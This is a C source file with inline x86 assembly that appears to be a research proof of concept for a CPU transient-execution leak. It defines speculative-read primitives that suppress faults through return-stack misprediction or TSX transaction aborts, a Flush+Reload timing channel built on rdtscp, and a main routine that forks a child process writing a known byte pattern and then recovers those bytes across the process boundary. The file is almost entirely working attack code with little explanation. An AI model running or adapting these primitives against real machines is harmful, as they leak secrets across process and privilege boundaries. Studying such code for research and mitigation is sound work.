#define ITERS 10000

#include <ctype.h>
#include <malloc.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>

/* Speculated read, suppressed with RSB misprediction. */
static inline __attribute__((always_inline)) void
speculate_leak_normal(unsigned char *leak, unsigned char *reloadbuffer) {
  asm volatile(
      // call which never returns
      "call 2f\n"
      // speculated read
      "movq (%0), %%rax\n"
      "andq $0xff, %%rax\n"
      "shl $0xa, %%rax\n"
      "prefetcht0 (%%rax, %1)\n"

      // infinite loop
      "3: pause\n"
      "jmp 3b\n"
      // call target
      "2:\n"
      "movabs $1f, %%rax\n"
      "mov %%rax, (%%rsp)\n"
      "clflush (%%rsp)\n"
      // "mfence\n"
      "retq\n"
      // actual return point
      "1:\n" ::"r"(leak),
      "r"(reloadbuffer)
      : "rax");
}

/* Speculated read, suppressed with RSB misprediction, with a clflush. */
static inline __attribute__((always_inline)) void
speculate_leak_clflush(unsigned char *leak, unsigned char *reloadbuffer,
                       unsigned char *to_flush) {
  asm volatile(
      // call which never returns
      "call 2f\n"
      // flush a page
      "clflush (%2)\n"
      // speculated read
      "movq (%0), %%rax\n"
      "andq $0xff, %%rax\n"
      "shl $0xa, %%rax\n"
      "prefetcht0 (%%rax, %1)\n"
      // infinite loop
      "3: pause\n"
      "jmp 3b\n"
      // call target
      "2:\n"
      "movabs $1f, %%rax\n"
      "imulq $1, %%rax, %%rax\n"
      "imulq $1, %%rax, %%rax\n"
      "imulq $1, %%rax, %%rax\n"
      "imulq $1, %%rax, %%rax\n"
      "imulq $1, %%rax, %%rax\n"
      "imulq $1, %%rax, %%rax\n"
      "imulq $1, %%rax, %%rax\n"
      "imulq $1, %%rax, %%rax\n"
      "imulq $1, %%rax, %%rax\n"
      "imulq $1, %%rax, %%rax\n"
      "imulq $1, %%rax, %%rax\n"
      "imulq $1, %%rax, %%rax\n"
      "mov %%eax, (%%rsp)\n"
      "retq\n"
      // actual return point
      "1:\n" ::"r"(leak),
      "r"(reloadbuffer), "r"(to_flush)
      : "rax");
}

/* cache-conflict TSX abort (temporal), plus a clflush */
static inline __attribute__((always_inline)) void
tsxabort_leak_clflush(unsigned char *leak, unsigned char *reloadbuffer,
                      unsigned char *flushbuffer) {
  asm volatile(
      // leak setup
      "clflush (%0)\n"
      "sfence\n"
      // clflush
      "clflush (%2)\n"
      // transaction
      "xbegin 1f\n"
      "movzbq 0x0(%0), %%rax\n"
      "shl $0xa, %%rax\n"
      "movzbq (%%rax, %1), %%rax\n"
      "xend\n"
      "1:\n" ::"r"(leak),
      "r"(reloadbuffer), "r"(flushbuffer)
      : "rax");
}

/* tsxabort_leak_clflush with a bitshift to get bytes at non-zero offsets */
static inline __attribute__((always_inline)) void
tsxabort_leak_clflush_shifted(unsigned char *leak, unsigned char *reloadbuffer,
                              unsigned char *flushbuffer, uint8_t shift) {
  asm volatile(
      // leak setup
      "clflush (%0)\n"
      "sfence\n"
      // clflush
      "clflush (%0)\n"
      // transaction
      "xbegin 1f\n"
      "movdqu 0x0(%0), %%xmm0\n"
      "movq %%xmm0, %%rax\n"
      "shr %%cl, %%rax\n"
      "and $0xff, %%rax\n"
      "shl $0xa, %%rax\n"
      "movzbq (%%rax, %1), %%rax\n"
      "xend\n"
      "1:\n" ::"r"(leak),
      "r"(reloadbuffer), "r"(flushbuffer), "c"(shift)
      : "rax", "xmm0");
}

/* cache-conflict TSX abort (temporal), bare */
static inline __attribute__((always_inline)) void
tsxabort_leak_bareconflict(unsigned char *leak, unsigned char *reloadbuffer,
                           unsigned char *flushbuffer) {
  asm volatile(
      // leak setup
      "clflush (%0)\n"
      "sfence\n"
      // transaction
      "xbegin 1f\n"
      "movzbq 0x0(%0), %%rax\n"
      "shl $0xa, %%rax\n"
      "movzbq (%%rax, %1), %%rax\n"
      "xend\n"
      "1:\n" ::"r"(leak),
      "r"(reloadbuffer), "r"(flushbuffer)
      : "rax");
}

/* just read from a pointer inside TSX */
static inline __attribute__((always_inline)) void
tsx_leak_read_normal(unsigned char *leak, unsigned char *reloadbuffer) {
  asm volatile("xbegin 1f\n"
               "movzbq 0x0(%0), %%rax\n"
               "shl $0xa, %%rax\n"
               "movzbq (%%rax, %1), %%rax\n"
               "xend\n"
               "1:\n" ::"r"(leak),
               "r"(reloadbuffer)
               : "rax");
}

#ifndef ITERS
#define ITERS 10000
#endif

#include <sys/prctl.h>
#ifndef PR_SET_SPECULATION_CTRL
#define PR_SET_SPECULATION_CTRL 53
#endif
#ifndef PR_SPEC_DISABLE
#define PR_SPEC_DISABLE 4
#endif

#define MMAP_FLAGS (MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB)

#define ALLOC_BUFFERS()                                                        \
  __attribute__((aligned(4096))) size_t results[256] = {0};                    \
  unsigned char *reloadbuffer =                                                \
      (unsigned char *)mmap(NULL, 2 * 4096 * 256, PROT_READ | PROT_WRITE,      \
                            MMAP_FLAGS, -1, 0) +                               \
      0x80;                                                                    \
  unsigned char *leak =                                                        \
      mmap(NULL, 2 * 4096 * 256, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0);   \
  unsigned char *privatebuf =                                                  \
      mmap(NULL, 4096 * 128, PROT_READ | PROT_WRITE, MMAP_FLAGS, -1, 0);       \
  (void)privatebuf;

static inline void enable_SSBM() { prctl(PR_SET_SPECULATION_CTRL, 0, 8, 0, 0); }

static inline __attribute__((always_inline)) void enable_alignment_checks() {
  asm volatile("pushf\n"
               "orl $(1<<18), (%rsp)\n"
               "popf\n");
}

static inline __attribute__((always_inline)) void disable_alignment_checks() {
  asm volatile("pushf\n"
               "andl $~(1<<18), (%rsp)\n"
               "popf\n");
}

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
  uint64_t lo, hi;
  asm volatile("rdtscp\n" : "=a"(lo), "=d"(hi)::"rcx");
  return (hi << 32) | lo;
}

/* flush all lines of the reloadbuffer */
static inline __attribute__((always_inline)) void
flush(unsigned char *reloadbuffer) {
  for (size_t k = 0; k < 256; ++k) {
    size_t x = ((k * 167) + 13) & (0xff);
    volatile void *p = reloadbuffer + x * 1024;
    asm volatile("clflush (%0)\n" ::"r"(p));
  }
}

/* update results based on timing of reloads */
static inline __attribute__((always_inline)) void
reload(unsigned char *reloadbuffer, size_t *results) {
  asm volatile("mfence\n");
  for (size_t k = 0; k < 256; ++k) {
    size_t x = ((k * 167) + 13) & (0xff);

    unsigned char *p = reloadbuffer + (1024 * x);

    uint64_t t0 = rdtscp();
    *(volatile unsigned char *)p;
    uint64_t dt = rdtscp() - t0;

    if (dt < 160)
      results[x]++;
  }
}

void print_results(size_t *results) {
  for (size_t c = 1; c < 256; ++c) {
    if (results[c] >= ITERS / 100) {
      printf("%08zu: %02x (%c)\n", results[c], (unsigned int)c,
             isprint(c) ? (unsigned int)c : '?');
    }
  }
}

int main() {
  pid_t pid = fork();
  if (pid == 0) {
    while (1)
      asm volatile("movq %0, (%%rsp)\n"
                   "mfence\n" ::"r"(0x8887868584838281ull));
  }
  if (pid < 0)
    return 1;

  ALLOC_BUFFERS();
  (void)leak;

  memset(results, 0, sizeof(results));

  for (size_t i = 0; i < ITERS; ++i) {
    flush(reloadbuffer);
    asm volatile("mfence\n");
    speculate_leak_normal(NULL, reloadbuffer);
    reload(reloadbuffer, results);
  }

  print_results(results);
  kill(pid, SIGKILL);
}
